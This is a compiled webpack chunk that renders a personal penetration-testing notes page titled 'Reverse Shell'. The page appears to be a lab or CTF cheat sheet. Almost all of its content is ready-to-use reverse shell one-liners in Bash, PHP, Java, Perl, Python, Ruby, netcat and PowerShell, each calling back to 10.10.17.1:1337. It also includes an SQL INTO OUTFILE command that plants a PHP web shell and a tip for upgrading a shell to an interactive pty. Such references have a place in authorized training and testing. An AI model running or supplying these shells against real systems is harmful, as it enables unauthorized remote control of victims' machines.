"use strict";(globalThis.webpackChunkportfolio=globalThis.webpackChunkportfolio||[]).push([[7894],{8453:(e,s,r)=>{r.d(s,{R:()=>i,x:()=>c});var l=r(6540);const n={},t=l.createContext(n);function i(e){const s=l.useContext(t);return l.useMemo(function(){return"function"==typeof e?e(s):{...s,...e}},[s,e])}function c(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(n):e.components||n:i(e.components),l.createElement(t.Provider,{value:s},e.children)}},9609:(e,s,r)=>{r.r(s),r.d(s,{assets:()=>h,contentTitle:()=>c,default:()=>d,frontMatter:()=>i,metadata:()=>l,toc:()=>o});const l=JSON.parse('{"id":"general/Reverse Shell","title":"Reverse Shell","description":"If victim is Linux, always run python3 -c \'import pty; pty.spawn(\\"/bin/bash\\")\' for interactive shell","source":"@site/docs/general/Reverse Shell.md","sourceDirName":"general","slug":"/general/Reverse Shell","permalink":"/portfolio/docs/general/Reverse Shell","draft":false,"unlisted":false,"tags":[],"version":"current","lastUpdatedAt":1765120889000,"frontMatter":{},"sidebar":"docsSidebar","previous":{"title":"RPC","permalink":"/portfolio/docs/general/RPC"},"next":{"title":"SMB","permalink":"/portfolio/docs/general/SMB"}}');var n=r(4848),t=r(8453);const i={},c=void 0,h={},o=[{value:"Bash reverse shell",id:"bash-reverse-shell",level:2},{value:"PHP reverse shell",id:"php-reverse-shell",level:2},{value:"Java reverse shell",id:"java-reverse-shell",level:2},{value:"Perl reverse shell",id:"perl-reverse-shell",level:2},{value:"Python reverse shell",id:"python-reverse-shell",level:2},{value:"Ruby reverse shell",id:"ruby-reverse-shell",level:2},{value:"Netcat reverse shell",id:"netcat-reverse-shell",level:2},{value:"Powershell reverse shell",id:"powershell-reverse-shell",level:2},{value:"SQL &amp; PHP reverse shell",id:"sql--php-reverse-shell",level:2}];function a(e){const s={a:"a",code:"code",h2:"h2",p:"p",pre:"pre",...(0,t.R)(),...e.components};return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsxs)(s.p,{children:["If victim is Linux, always run ",(0,n.jsx)(s.code,{children:"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"})," for interactive shell"]}),"\n",(0,n.jsx)(s.h2,{id:"bash-reverse-shell",children:"Bash reverse shell"}),"\n",(0,n.jsx)(s.p,{children:(0,n.jsx)(s.code,{children:"/bin/bash -i >& /dev/tcp/10.10.17.1/1337 0>&1"})}),"\n",(0,n.jsx)(s.h2,{id:"php-reverse-shell",children:"PHP reverse shell"}),"\n",(0,n.jsx)(s.p,{children:(0,n.jsx)(s.code,{children:'php -r \'$sock=fsockopen("10.10.17.1",1337);exec("/bin/sh -i <&3 >&3 2>&3");\''})}),"\n",(0,n.jsx)(s.p,{children:"If this does not work, you can try replacing &3 with consecutive file descriptors (idk what this mean)"}),"\n",(0,n.jsx)(s.h2,{id:"java-reverse-shell",children:"Java reverse shell"}),"\n",(0,n.jsx)(s.p,{children:"If the target machine uses Java, try the following simple example:"}),"\n",(0,n.jsx)(s.pre,{children:(0,n.jsx)(s.code,{className:"language-java",children:'r = Runtime.getRuntime()\r\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.17.1/1337;\r\ncat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])\r\np.waitFor()\n'})}),"\n",(0,n.jsx)(s.h2,{id:"perl-reverse-shell",children:"Perl reverse shell"}),"\n",(0,n.jsx)(s.pre,{children:(0,n.jsx)(s.code,{className:"language-perl",children:'perl -e \'use Socket;$i="10.10.17.1";$p=1337;\r\nsocket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));\r\nif(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");\r\nopen(STDOUT,">&S");open(STDERR,">&S");\r\nexec("/bin/sh -i");};\'\n'})}),"\n",(0,n.jsx)(s.h2,{id:"python-reverse-shell",children:"Python reverse shell"}),"\n",(0,n.jsx)(s.pre,{children:(0,n.jsx)(s.code,{className:"language-python",children:'python -c \'import socket,subprocess,os;\r\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\r\ns.connect(("10.10.17.1",1337));\r\nos.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);\r\np=subprocess.call(["/bin/sh","-i"]);\'\n'})}),"\n",(0,n.jsx)(s.h2,{id:"ruby-reverse-shell",children:"Ruby reverse shell"}),"\n",(0,n.jsx)(s.pre,{children:(0,n.jsx)(s.code,{className:"language-ruby",children:'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("10.10.17.1","1337");\r\nwhile(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\';\n'})}),"\n",(0,n.jsx)(s.p,{children:"or"}),"\n",(0,n.jsx)(s.pre,{children:(0,n.jsx)(s.code,{className:"language-ruby",children:'ruby -rsocket -e\'f=TCPSocket.open("10.0.17.1",1337).to_i;\r\nexec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'\n'})}),"\n",(0,n.jsx)(s.h2,{id:"netcat-reverse-shell",children:"Netcat reverse shell"}),"\n",(0,n.jsx)(s.p,{children:(0,n.jsx)(s.code,{children:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.17.1 1337 >/tmp/f"})}),"\n",(0,n.jsx)(s.h2,{id:"powershell-reverse-shell",children:"Powershell reverse shell"}),"\n",(0,n.jsx)(s.p,{children:(0,n.jsx)(s.a,{href:"/docs/appendix/encode-py",children:"encode.py"})}),"\n",(0,n.jsx)(s.p,{children:"or"}),"\n",(0,n.jsx)(s.pre,{children:(0,n.jsx)(s.code,{className:"language-powershell",children:'$sm=(New-Object Net.Sockets.TCPClient("10.10.17.1",1337)).GetStream();\r\n[byte[]]$bt=0..255|%{0};\r\nwhile(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);\r\n$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));\r\n$sm.Write($st,0,$st.Length)}\n'})}),"\n",(0,n.jsx)(s.h2,{id:"sql--php-reverse-shell",children:"SQL & PHP reverse shell"}),"\n",(0,n.jsxs)(s.p,{children:[(0,n.jsx)(s.code,{children:'select "<?php echo shell_exec($_GET[\'c\']);?>" INTO OUTFILE "<php DOCUMENT_ROOT>/webshell.php"'})," then u can access the webshell by going ",(0,n.jsx)(s.code,{children:"http://<url>/webshell.php?c=whoami"})]}),"\n",(0,n.jsxs)(s.p,{children:["Credit: ",(0,n.jsx)(s.a,{href:"https://www.invicti.com/learn/reverse-shell",children:"Invicti"})]})]})}function d(e={}){const{wrapper:s}={...(0,t.R)(),...e.components};return s?(0,n.jsx)(s,{...e,children:(0,n.jsx)(a,{...e})}):a(e)}}}]);